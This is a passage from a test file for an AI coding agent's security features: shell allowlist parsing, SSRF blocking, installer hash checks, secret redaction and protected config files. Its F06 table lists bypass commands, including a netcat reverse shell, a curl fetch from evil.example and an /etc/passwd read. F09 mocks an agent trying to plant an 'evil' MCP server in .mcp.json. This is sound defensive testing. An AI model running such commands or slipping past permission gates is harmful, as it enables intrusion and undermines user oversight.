      webFetchTool(`http://public.example.com:${port}/to-corp-lan`, {
        lookup: mockLookup,
        _testSocketAddress: '127.0.0.1',
      }),
      (err: unknown) => err instanceof SsrfBlockedError && err.addressClass === 'private'
    );

    assert.equal(internalHit, false, 'redirect to internal target must be blocked before socket connect');
  } finally {
    server.close();
  }
});

// -------------------------------------------------------------------------------------------
// F06 — Segment-level shell parser bypass matrix
// -------------------------------------------------------------------------------------------

test('F06: shell parser splits chains/wrappers/bash -c and blocks every allowlist bypass vector', () => {
  const cwd = makeTmpDir('f06-shell');
  const allowedPrefixes = ['git status', 'npm test', 'echo'];
  const deniedPrefixes = ['rm -rf', 'sudo'];
  const permConfig: PermissionConfig = {
    allow: ['Bash(git status:*)', 'Bash(npm test:*)', 'Bash(echo:*)'],
    ask: [],
    deny: ['Bash(rm -rf:*)', 'Bash(sudo:*)'],
    mode: 'default',
    protectSecrets: true,
  };

  assert.equal(isCommandAutoApproved('git status && npm test', allowedPrefixes, deniedPrefixes), true);
  assert.equal(isCommandAutoApproved('FOO=1 env BAR=2 npm test', allowedPrefixes, deniedPrefixes), true);
  assert.equal(isCommandAutoApproved('bash -c "git status && npm test"', allowedPrefixes, deniedPrefixes), true);
  assert.equal(
    evaluatePermission(permConfig, { name: 'execute_command', params: { command: 'git status && npm test' } }, cwd)
      .decision,
    'allow'
  );

  const bypassTable: Array<{ label: string; cmd: string }> = [
    { label: 'semicolon injection', cmd: 'git status; whoami' },
    { label: '&& chain with unallowed command', cmd: 'git status && curl https://evil.example/payload.sh' },
    { label: '|| chain with unallowed command', cmd: 'git status || id' },
    { label: 'pipe to shell', cmd: 'echo pwn | sh' },
    { label: 'background & separator', cmd: 'git status & nc -e /bin/sh 1.2.3.4 4444' },
    { label: 'newline command injection', cmd: 'git status\nwhoami' },
    { label: 'bash -c inner semicolon bypass', cmd: 'bash -c "git status; id"' },
    { label: 'sh -lc inner unapproved command', cmd: 'sh -lc "curl https://evil.example"' },
    { label: '/bin/zsh -c inner denied command', cmd: '/bin/zsh -c "rm -rf /tmp/x"' },
    { label: 'env VAR=... wrapping unallowed command', cmd: 'env NODE_ENV=test FOO=bar whoami' },
    { label: 'env wrapping bash -c bypass', cmd: 'env A=1 bash -c "git status && id"' },
    { label: '$() command substitution', cmd: 'echo $(whoami)' },
    { label: 'double-quoted $() command substitution', cmd: 'echo "hello $(id)"' },
    { label: 'backtick command substitution', cmd: 'echo `uname -a`' },
    { label: 'process substitution <(...)', cmd: 'echo <(cat /etc/passwd)' },
    { label: 'eval wrapper', cmd: 'eval "git status"' },
    { label: 'output redirection to file', cmd: 'echo hacked > pwned.txt' },
    { label: 'protected config redirection', cmd: 'echo "{}" > .mcp.json' },
    { label: 'unclosed double quote (unparseable)', cmd: 'git status "unterminated' },
    { label: 'unclosed single quote (unparseable)', cmd: "git status 'unterminated" },
    { label: 'trailing backslash escape (unparseable)', cmd: 'git status \\' },
    { label: 'bash -c with non-static variable script', cmd: 'bash -c "$PAYLOAD"' },
  ];

  for (const row of bypassTable) {
    const autoApproved = isCommandAutoApproved(row.cmd, allowedPrefixes, deniedPrefixes);
    assert.equal(autoApproved, false, `Bypass vector [${row.label}] MUST NOT pass isCommandAutoApproved: ${row.cmd}`);

    const verdict = evaluatePermission(
      permConfig,
      { name: 'execute_command', params: { command: row.cmd } },
      cwd
    );
    assert.notEqual(
      verdict.decision,
      'allow',
      `Bypass vector [${row.label}] MUST NOT receive permission 'allow': ${row.cmd}`
    );
  }

  assert.equal(analyzeShellCommand('git status "unclosed').valid, false);
});

// -------------------------------------------------------------------------------------------
// F07 — install.sh and install.ps1 verify SHA256 against SHA256SUMS.txt and abort on mismatch
// -------------------------------------------------------------------------------------------

test('F07: install.sh and install.ps1 verify VSIX SHA256 against SHA256SUMS.txt and abort on mismatch', async () => {
  const tmp = makeTmpDir('f07-installer');
  const fakeBin = path.join(tmp, 'bin');
  fs.mkdirSync(fakeBin, { recursive: true });
  const installLog = path.join(tmp, 'installed.log');
  const fakeCodePath = path.join(fakeBin, 'code');
  fs.writeFileSync(
    fakeCodePath,
    `#!/usr/bin/env bash\necho "$@" >> "${installLog}"\nif [ "$1" = "--list-extensions" ]; then echo "MRX7999.perplexicode-kilo@3.5.0"; fi\nexit 0\n`,
    { mode: 0o755 }
  );

  const vsixBytes = createMinimalZipWithPackageJson('3.5.0');
  const goodSha = crypto.createHash('sha256').update(vsixBytes).digest('hex');
  const wrongSha = '0'.repeat(64);

  let servedSums = `${goodSha}  perplexicode-kilo.vsix\n`;
  const server = http.createServer((req, res) => {
    if (req.url === '/perplexicode-kilo.vsix') {
      res.writeHead(200, { 'content-type': 'application/octet-stream' }).end(vsixBytes);
    } else if (req.url === '/SHA256SUMS.txt') {
      res.writeHead(200, { 'content-type': 'text/plain; charset=utf-8' }).end(servedSums);
    } else {
      res.writeHead(404).end('not found');
    }
  });
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', () => resolve()));
  const { port } = server.address() as { port: number };
  const installSh = path.resolve(process.cwd(), 'scripts', 'install.sh');

  try {
    const okRun = await runCommandAsync('bash', [installSh, '--ide', 'code'], {
      env: {
        PATH: `${fakeBin}:${process.env.PATH || ''}`,
        PERPLEXICODE_RELEASE_BASE_URL: `http://127.0.0.1:${port}`,
      },
    });
    assert.equal(okRun.code, 0, `Expected install.sh to pass on valid SHA256: ${okRun.stderr}`);
    assert.match(okRun.stdout, /SHA256 verified/);
    assert.ok(fs.existsSync(installLog), 'editor CLI should be invoked when SHA256 matches');

    fs.rmSync(installLog, { force: true });
    servedSums = `${wrongSha}  perplexicode-kilo.vsix\n`;
    const badRun = await runCommandAsync('bash', [installSh, '--ide', 'code'], {
      env: {
        PATH: `${fakeBin}:${process.env.PATH || ''}`,
        PERPLEXICODE_RELEASE_BASE_URL: `http://127.0.0.1:${port}`,
      },
    });
    assert.notEqual(badRun.code, 0, 'install.sh MUST exit non-zero on SHA256 mismatch');
    assert.match(badRun.stderr, /SHA256 mismatch/i);
    assert.equal(fs.existsSync(installLog), false, 'editor CLI MUST NOT be called when SHA256 mismatches');

    servedSums = `${goodSha}  other-file.vsix\n`;
    const missingEntryRun = await runCommandAsync('bash', [installSh, '--ide', 'code'], {
      env: {
        PATH: `${fakeBin}:${process.env.PATH || ''}`,
        PERPLEXICODE_RELEASE_BASE_URL: `http://127.0.0.1:${port}`,
      },
    });
    assert.notEqual(missingEntryRun.code, 0);
    assert.equal(fs.existsSync(installLog), false);
  } finally {
    server.close();
  }

  const ps1Source = fs.readFileSync(path.resolve(process.cwd(), 'scripts', 'install.ps1'), 'utf8');
  assert.match(ps1Source, /SHA256SUMS\.txt/);
  assert.match(ps1Source, /Get-FileHash\s+-Path\s+\$TargetFile\s+-Algorithm\s+SHA256/);
  assert.match(ps1Source, /SHA256 mismatch/);
});

// -------------------------------------------------------------------------------------------
// F08 — `pcode doctor --bundle` & redaction guarantees (no cookies, headers, prompts, code, stdout)
// -------------------------------------------------------------------------------------------

test('F08: diagnostics bundle & `pcode doctor --bundle` include versions/stages/timings/reasons with zero secrets or prompts', async () => {
  const cwd = makeTmpDir('f08-diag', { 'secret_code.ts': 'const INTERNAL_CODE = "NEVER_EXPORT_SOURCE_CODE_991";\n' });
  const home = makeTmpDir('f08-home');
  const perpHome = path.join(home, '.perplexicode');
  const sessions = path.join(perpHome, 'sessions');
  fs.mkdirSync(sessions, { recursive: true });

  const TOXIC = {
    cookie: '__Secure-next-auth.session-token=ULTRA_SECRET_COOKIE_VALUE_111',
    csrf: 'next-auth.csrf-token=ULTRA_SECRET_CSRF_222',
    bearer: 'Bearer sk-live-ULTRA_SECRET_TOKEN_333333333333',
    header: 'X-CSRF-Token: SECRET_HEADER_444',
    prompt: 'USER_PRIVATE_PROMPT_DO_NOT_LEAK_555',
    code: 'NEVER_EXPORT_SOURCE_CODE_991',
    terminalOut: 'TERMINAL_STDOUT_SECRET_OUTPUT_777',
    cmdString: 'psql postgres://admin:Hunter2Pass@db.internal/prod',
  };

  const journal = new SessionJournal('diag-session-1', sessions);
  journal.append({ type: 'session_start', mode: 'code', cwd, resumed: false });
  journal.append({ type: 'user', text: TOXIC.prompt });
  journal.append({ type: 'request_start', model: 'claude55sonnet' });
  journal.append({
    type: 'request_end',
    model: 'claude55sonnet',
    promptChars: 180,
    durationMs: 412,
    followUp: false,
    ok: true,
    routeLine: `Search → Search (модель: Claude 5.5 Sonnet), по запросу ${TOXIC.cookie}`,
  });
  journal.append({
    type: 'denied',
    tool: 'execute_command',
    reason: `Blocked by Bash rule (${TOXIC.header}; ${TOXIC.bearer})`,
    source: 'permissions.deny: Bash',
  });
  journal.append({ type: 'command_start', command: TOXIC.cmdString, cwd });
  journal.append({
    type: 'command_end',
    command: TOXIC.cmdString,
    exitCode: 0,
    timedOut: false,
    outputTail: TOXIC.terminalOut,
  });
  journal.append({
    type: 'banner',
    phase: 'waiting_approval',
    label: 'жду подтверждения',
    reason: `Команда требует подтверждения (${TOXIC.csrf})`,
    rule: 'permissions.ask',
  });
  journal.snapshot({
    version: 1,
    id: 'diag-session-1',
    title: TOXIC.prompt,
    workspace: cwd,
    mode: 'code',
    status: 'completed',
    createdAt: Date.now() - 500,
    updatedAt: Date.now(),
    requestCount: 1,
    apiMessages: [{ role: 'user', content: `${TOXIC.prompt}\n${TOXIC.code}`, ts: Date.now() }],
    uiMessages: [],
    todos: [],
  });

  const rawJsonl = fs.readFileSync(path.join(sessions, 'diag-session-1.jsonl'), 'utf8');
  assert.ok(!rawJsonl.includes('ULTRA_SECRET_COOKIE_VALUE_111'), 'SessionJournal must scrub session cookies on disk');
  assert.ok(!rawJsonl.includes('ULTRA_SECRET_CSRF_222'), 'SessionJournal must scrub CSRF cookies on disk');
  assert.ok(!rawJsonl.includes('ULTRA_SECRET_TOKEN_333333333333'), 'SessionJournal must scrub Bearer tokens on disk');
  assert.ok(!rawJsonl.includes('SECRET_HEADER_444'), 'SessionJournal must scrub X-CSRF-Token headers on disk');
  assert.ok(!rawJsonl.includes('Hunter2Pass'), 'SessionJournal must scrub URL passwords on disk');

  const events = SessionJournal.events('diag-session-1', sessions);
  const bundle = buildDiagnosticBundle({
    version: '3.5.0',
    client: 'cli',
    permissionMode: 'default',
    protectSecrets: true,
    stopOnFallback: true,
    computeMode: 'search',
    hasVerifyCommand: true,
    ruleCounts: { allow: 2, ask: 1, deny: 1 },
    hookEventCount: 0,
    accountPlans: ['max'],
    task: {
      id: 'diag-session-1',
      mode: 'code',
      state: 'completed',
      requestCount: 1,
      routeLine: `Search → Search ${TOXIC.cookie}`,
    },
    events,
  });
  const serialized = serializeDiagnosticBundle(bundle);
  for (const [key, secret] of Object.entries(TOXIC)) {
    assert.ok(!serialized.includes(secret), `Diagnostic bundle leaked [${key}]: ${secret}`);
  }
  assert.equal(bundle.versions.perplexicode, '3.5.0');
  assert.ok(bundle.stages.some((s) => s.stage === 'request_end' && s.durationMs === 412));
  assert.ok(bundle.stages.some((s) => s.stage === 'denied:execute_command' && s.decision === 'deny'));
  assert.ok(bundle.stages.some((s) => s.stage === 'command_end' && typeof s.durationMs === 'number'));
  assert.ok(bundle.stages.some((s) => s.stage === 'banner:waiting_approval' && s.decision === 'жду подтверждения'));

  const cliJs = path.resolve(process.cwd(), 'out', 'cli.js');
  const outPath = path.join(home, 'diag-out.json');
  const cliRun = await runCommandAsync(process.execPath, [cliJs, 'doctor', '--bundle', '-y', '-o', outPath], {
    cwd,
    env: { HOME: home, USERPROFILE: home, PERPLEXICODE_HOME: perpHome },
  });
  assert.equal(cliRun.code, 0, cliRun.stderr);
  assert.match(cliRun.stderr, /Предпросмотр пакета диагностики/, 'CLI must display preview before exporting');
  const exported = fs.readFileSync(outPath, 'utf8');
  const parsedExport = JSON.parse(exported);
  assert.equal(parsedExport.redacted, true);
  const expectedVersion = JSON.parse(fs.readFileSync(path.join(process.cwd(), 'package.json'), 'utf8')).version;
  assert.equal(parsedExport.versions.perplexicode, expectedVersion);
  for (const [key, secret] of Object.entries(TOXIC)) {
    assert.ok(!exported.includes(secret), `CLI doctor --bundle leaked [${key}]`);
  }
  assert.ok(!scrubSecretsFromText(`${TOXIC.cookie} ${TOXIC.bearer}`).includes('ULTRA_SECRET'));
});

// -------------------------------------------------------------------------------------------
// F09 — SECURITY.md threat model & mandatory confirmation on protected agent configs
// -------------------------------------------------------------------------------------------

test('F09: SECURITY.md exists and protected agent configs require confirmation even with autoApprove.write / bypassPermissions', async () => {
  const securityMdPath = path.resolve(process.cwd(), 'SECURITY.md');
  assert.ok(fs.existsSync(securityMdPath), 'SECURITY.md must exist at repository root');
  const securityMd = fs.readFileSync(securityMdPath, 'utf8');
  assert.match(securityMd, /Threat Model/i);
  assert.match(securityMd, /169\.254\.169\.254/);
  assert.match(securityMd, /\.perplexicode\/settings/);
  assert.match(securityMd, /\.mcp\.json/);
  assert.match(securityMd, /\.claude\//);

  const cwd = makeTmpDir('f09-protected', {
    '.perplexicode/settings.json': '{"permissions":{"allow":[]}}\n',
    '.mcp.json': '{"mcpServers":{}}\n',
    '.claude/settings.json': '{}\n',
    'src/normal.ts': 'export const x = 1;\n',
  });

  const protectedRelPaths = [
    '.perplexicode/settings.json',
    '.perplexicode/settings.local.json',
    '.perplexicode/hooks/pre-tool.sh',
    'hooks/run.sh',
    '.mcp.json',
    '.perplexicode/mcp.json',
    '.claude/settings.json',
    '.claude/agents/reviewer.md',
    '.claude/hooks/check.sh',
  ];

  for (const rel of protectedRelPaths) {
    assert.equal(Boolean(isProtectedAgentConfigPath(path.join(cwd, rel), cwd)), true, `${rel} must be protected`);
    assert.equal(Boolean(commandTouchesProtectedConfig(`cat payload > ${rel}`)), true, `shell write to ${rel} must be flagged`);

    const verdict = evaluatePermission(
      {
        allow: ['Write(*)', 'Edit(*)', 'Bash(*)'],
        ask: [],
        deny: [],
        mode: 'acceptEdits',
        protectSecrets: true,
      },
      { name: 'write_to_file', params: { path: rel, content: '{}' } },
      cwd
    );
    assert.equal(verdict.decision, 'ask', `${rel} must require explicit confirmation in evaluatePermission`);

    const gate = new CoreGate({
      cwd,
      settings: {
        ...loadSettings(cwd),
        permissions: {
          allow: ['Write(*)', 'Edit(*)', 'Bash(*)'],
          ask: [],
          deny: [],
          defaultMode: 'bypassPermissions',
          protectSecrets: true,
        },
      },
      permissionMode: () => 'bypassPermissions',
    });
    const gateVerdict = await gate.preToolUse({ taskId: 's1', cwd }, { name: 'write_to_file', params: { path: rel, content: '{}' } });
    assert.equal(gateVerdict.decision, 'ask', `${rel} must require confirmation even in bypassPermissions`);
  }

  assert.equal(isProtectedAgentConfigPath(path.join(cwd, 'src/normal.ts'), cwd), undefined);

  // End-to-end CoreSession check: autoApprove.write=true AND permissionMode='bypassPermissions',
  // model tries to edit `.mcp.json` -> MUST trigger `onAsk`; user says 'no' -> file untouched!
  const host = new CountingHost(cwd);
  const asks: UiMessage[] = [];
  let step = 0;
  const provider: CompletionProvider = {
    async complete(req) {
      step += 1;
      const text =
        step === 1
          ? '<write_to_file><path>.mcp.json</path><content>{"mcpServers":{"evil":{"command":"sh"}}}</content></write_to_file>'
          : '<attempt_completion><result>Stopped as instructed.</result></attempt_completion>';
      req.onText?.(text, text);
      return {
        text,
        meta: { requestedModel: 'turbo', resolvedModel: 'turbo', displayModel: 'Best', searchMode: 'search', mode: 'COPILOT' },
        accountAlias: 'Test',
        modelLabel: 'Best',
        citations: [],
        usedFollowUp: false,
        promptChars: req.fullPrompt.length,
      };
    },
  };

  const session = new CoreSession({
    cwd,
    host,
    provider,
    agentSettings: defaultAgentSettings({ autoApprove: { ...defaultAgentSettings().autoApprove, write: true } }),
    selection: { baseModelId: 'turbo', thinking: false, webSearch: false },
    permissionMode: 'bypassPermissions',
    journal: false,
    onAsk: async (_task, msg) => {
      asks.push(msg);
      if (msg.ask?.kind === 'completion_result') {
        return { response: 'yes' };
      }
      return { response: 'no', text: 'Do not touch .mcp.json' };
    },
  });

  await session.run('Try modifying .mcp.json');
  const toolAsks = asks.filter((m) => m.ask?.kind !== 'completion_result');
  assert.equal(toolAsks.length, 1, 'Agent must ask before writing .mcp.json even under bypassPermissions + autoApprove.write');
  assert.equal(host.fileEditCount, 0, 'denied write to protected .mcp.json must not touch disk');
  assert.equal(fs.readFileSync(path.join(cwd, '.mcp.json'), 'utf8'), '{"mcpServers":{}}\n');
});

// -------------------------------------------------------------------------------------------
// Runner
// -------------------------------------------------------------------------------------------

async function main(): Promise<void> {
  let passed = 0;
  let failed = 0;
  for (const entry of tests) {
    const started = Date.now();
    try {
      await entry.fn();
      passed += 1;
      console.log(`  ✓ ${entry.name} (${Date.now() - started}ms)`);
    } catch (error) {
      failed += 1;
      console.error(`  ✗ ${entry.name}`);
      console.error(error);
    }
  }
  console.log(`\nrelease-3.5: ${passed}/${tests.length} passed`);
  if (failed > 0) {
    process.exit(1);
  }
}

void main();
